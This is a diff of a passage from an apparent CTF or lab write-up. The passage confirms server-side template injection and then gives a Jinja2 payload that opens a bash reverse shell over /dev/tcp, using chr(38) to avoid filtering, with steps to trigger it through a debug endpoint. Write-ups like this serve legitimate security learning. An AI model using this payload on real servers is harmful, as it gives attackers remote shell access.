@@ -316,8 +316,9 @@ debugging
 we got 49, that confirms that it's vulnerable to ssti, now let's get a reverse shell since we can execute commands with ssti.
 
 the payload i'll use for the reverse shell is :
-{{config.__class__.__init__.__globals__["os"].popen("bash -c \"bash -i >" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + " /dev/tcp/IP/PORT 0>" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + "1\"")}}
-
+```
+{ {config.__class__.__init__.__globals__["os"].popen("bash -c \"bash -i >" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + " /dev/tcp/IP/PORT 0>" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + "1\"")}}
+```
 Using this and the password on the debug page should get you a revesre shell
 It should say Executed, once then you have to open /debugresult in order to make that payload actually run, as /debug only caches it in session.
 
